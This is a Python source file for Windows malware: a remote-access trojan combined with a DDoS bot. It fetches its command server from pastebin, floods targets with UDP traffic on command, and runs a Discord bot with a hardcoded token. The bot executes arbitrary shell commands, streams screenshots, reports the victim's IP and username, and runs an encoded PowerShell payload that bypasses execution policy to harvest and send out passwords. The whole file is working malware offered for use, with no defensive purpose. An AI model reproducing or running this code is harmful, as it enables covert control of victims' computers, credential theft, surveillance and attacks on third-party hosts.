import winreg
import ctypes
import os
from pystyle import Center
import random
import subprocess
import discord
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from discord.ext import commands
from ctypes import *
import asyncio
from discord import utils
import requests
from threading import Thread
from time import time, sleep
import socket, signal
import sys, random
from typing import Tuple

userip = str(requests.get("https://api.ipify.org").text)

def shell():
	token = 'MTAyOTQ4NjcyNzM1NTcxMTUwOA.GEuACk.rKsseN8vL7mhUPL1ahb_5DoA0KExhdF0RFI1Ug'
	class MyClient(discord.Client):
		async def on_ready(self):
			print('Logged on as', self.user)
			import platform
			import re
			import urllib.request
			import json
			with urllib.request.urlopen("https://geolocation-db.com/json") as url:
				data = json.loads(url.read().decode())
				flag = data['country_code']
				ip = data['IPv4']
			import os
			total = []
			global number
			number = 1
			global channel_name
			channel_name = None
			for x in client.get_all_channels(): 
				total.append(x.name)
			for y in range(len(total)):
				if total[y].startswith("session"):
					import re
					result = [e for e in re.split("[^0-9]", total[y]) if e != '']
					biggest = max(map(int, result))
					number = biggest + 1
				else:
					pass  
			channel_name = f"session-{number}"
			newchannel = await client.guilds[0].create_text_channel(channel_name)
			channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
			channel = client.get_channel(channel_.id)
			is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
			value1 = f"@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} |  :flag_{flag.lower()}: | User : {os.getlogin()} | IP: {ip}"
			if is_admin == True:
				await channel.send(f'{value1} | admin!')
			elif is_admin == False:
				await channel.send(value1)
			game = discord.Game(f"Window logging stopped")
			await client.change_presence(status=discord.Status.online, activity=game)



		async def on_message(self, message):
			if message.channel.name != channel_name:
				pass
			else:
				total = []
				for x in client.get_all_channels(): 
					total.append(x.name)
				if message.content.startswith("!kill"):
					try:
						if message.content[6:] == "all":
							for y in range(len(total)): 
								if "session" in total[y]:
									channel_to_delete = discord.utils.get(client.get_all_channels(), name=total[y])
									await channel_to_delete.delete()
							else:
								pass
						else:
							channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
							await channel_to_delete.delete()
							await message.channel.send(f"[*] {message.content[6:]} killed.")
					except:
						await message.channel.send(f"[!] {message.content[6:]} is invalid,please enter a valid session name")
			# don't respond to ourselves
			if message.author == self.user:
				return

			if message.content == "!streamscreen" :
				await message.channel.send("[*] Command successfuly executed")
				import os
				from mss import mss
				temp = (os.getenv('TEMP'))
				hellos = temp + r"\hobos\hellos.txt"        
				if os.path.isfile(hellos):
					os.system(r"del %temp%\hobos\hellos.txt /f")
					os.system(r"RMDIR %temp%\hobos /s /q")      
				else:
					pass
				while True:
					with mss() as sct:
						sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
						path = (os.getenv('TEMP')) + r"\monitor.png"
						file = discord.File((path), filename="monitor.png")
						await message.channel.send(file=file)
						temp = (os.getenv('TEMP'))
						hellos = temp + r"\hobos\hellos.txt"
					if os.path.isfile(hellos):
						break
					else:
						continue
								
			if message.content == "!stopscreen":  
				import os
				os.system(r"mkdir %temp%\hobos")
				os.system(r"echo hello>%temp%\hobos\hellos.txt")
				os.system(r"del %temp%\monitor.png /F")

			if message.content.startswith("!shell"):
						global status
						status = None
						import subprocess
						import os
						instruction = message.content[7:]
						def shell(command):
							output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
							global status
							status = "ok"
							return output.stdout.decode('CP437').strip()
						out = shell(instruction)
						print(out)
						print(status)
						if status:
							numb = len(out)
							if numb < 1:
								await message.channel.send("[*] Command not recognized or no output was obtained")
							elif numb > 1990:
								temp = (os.getenv('TEMP'))
								f1 = open(temp + r"\output.txt", 'a')
								f1.write(out)
								f1.close()
								file = discord.File(temp + r"\output.txt", filename="output.txt")
								await message.channel.send("[*] Command successfuly executed", file=file)
								os.remove(temp + r"\output.txt")
							else:
								await message.channel.send("[*] Command successfuly executed : " + out)
						else:
							await message.channel.send("[*] Command not recognized or no output was obtained")
							status = None

			if message.content == "!passwords" :
						import subprocess
						import os
						temp= os.getenv('temp')
						def shell(command):
							output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
							global status
							status = "ok"
							return output.stdout.decode('CP437').strip()
						passwords = shell("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=")
						f4 = open(temp + r"\passwords.txt", 'w')
						f4.write(str(passwords))
						f4.close()
						file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
						await message.channel.send("[*] Command successfuly executed", file=file)
						os.remove(temp + r"\passwords.txt")

	intents = discord.Intents.default()
	intents.message_content = True
	client = MyClient(intents=intents)
	client.run(token)


def clear():
	import platform
	if platform.system() == "Windows":
		os.system("cls")
	else:
		os.system("clear")


HOST = str(requests.get("https://pastebin.com/raw/K36FCxFt").text)
PORT = 4444

class Client():
	run=False
	def __init__(self, connect:Tuple[str,int]=(HOST,PORT)) -> None:
		signal.signal(signal.SIGINT, self.exit_gracefully)
		signal.signal(signal.SIGTERM, self.exit_gracefully)
		self.stop = False
		self.run = False
		while not self.stop:
			try:
				self._connect(connect)
			except KeyboardInterrupt:
				continue
			except Exception as e:
				print(Center.Center(f"Error connecting {connect} "))
				sleep(3)
				clear()

	def exit_gracefully(self,signum, frame):
		print("\nExiting....")
		self.stop = True
		self.run = False
		self.sock.close()
		sleep(1)
		sys.exit(0)

	def _connect(self, connect:Tuple[str,int]) -> None:
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.connect(connect)
		self.start()

	def __ddos(self,*args):

		def dos(*args):
			t1=time()
			host,port=args[1],args[2]

			s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			bytes=random._urandom(10240)
			s.connect((host, int(port)))
			while self.run:
				if not self.run:break
				s.sendto(bytes, (host,int(port)))
				
			s.close()
			print("run time {}".format(time()-t1))
		for n in range(int(args[4])):
			Thread(target = dos,args=[*args]).start()
		sleep(int(args[3]))
		self.run=False

	def _recv(self):
		return self.sock.recv(1024).decode("ascii").lower()

	def start(self):
		while True:
			data = self._recv()
			if "attack" in data:

				data=data.replace("attack ","").split()
				try:
					proto, ip, port, sec, workers =  data
					data = proto, ip, int(port), int(sec), int(workers)
					self.sock.send("Attack Started".encode("ascii"))
				except Exception as e:
					print(e)
					self.sock.send("invalid command".encode("ascii"))
					continue

				self.run=True
				Thread(target = self.__ddos,args=data).start()

			elif "kill" in data:
				self.run=False
				self.sock.send(str.encode("Server Stopped"))
			elif "ping" in data:
				self.sock.send(str.encode("Pong"))

			elif "connect {}".format(userip) in data:
				self.sock.send(str.encode("Connected to {} | {}".format(userip),os.getlogin()))
				shell()
			else:
				self.sock.send(str.encode("ERROR"))


if __name__ == '__main__':
	Client()
